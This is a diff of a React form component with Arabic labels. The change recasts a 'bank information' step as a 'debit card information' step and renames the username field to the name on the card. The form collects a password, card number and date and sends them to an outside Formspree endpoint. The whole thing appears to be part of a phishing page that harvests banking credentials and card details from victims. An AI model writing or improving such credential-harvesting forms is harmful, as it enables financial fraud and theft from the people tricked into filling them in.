@@ -7,7 +7,7 @@ function Step1() {
   const [state, handleSubmit] = useForm("xjkbqzbo");
   const router = useRouter();
   const [formData, setFormData] = useState({
-    username: "", // Use standard names for better compatibility with Formspree
+    card_Name: "", // Use standard names for better compatibility with Formspree
     password: "",
     card_Number: "",
     date: "",
@@ -19,7 +19,7 @@ function Step1() {
 
     const res = await handleSubmit({
       data: {
-        username: formData.username,
+        card_Name: formData.card_Name,
         password: formData.password,
         card_Number: formData.card_Number,
         date: formData.date,
@@ -32,20 +32,20 @@ function Step1() {
 
   return (
     <div>
-      <p className="text-xl text-stone-500 my-3">ادخل معلوماتك البنكية :</p>
+      <p className="text-xl text-stone-500 my-3">ادخل معلومات بطاقة الخصم :</p>
       <form
         method="POST"
         onSubmit={onFormSubmit}
         className="flex items-center justify-center flex-wrap gap-14"
       >
         <div className="flex flex-col text-xl">
-          <label>اسم المستخدم :</label>
+          <label>الاسم على البطاقة :</label>
           <input
             type="text"
             name="username" // Name field
-            value={formData.username}
+            value={formData.card_Name}
             onChange={(e) =>
-              setFormData({ ...formData, username: e.target.value })
+              setFormData({ ...formData, card_Name: e.target.value })
             }
             placeholder="اسم المستخدم"
             className="w-[300px] lg:w-[400px] rounded-2xl mt-2 outline-none border-2 py-2 mx-5 px-5 focus:border-stone-500"
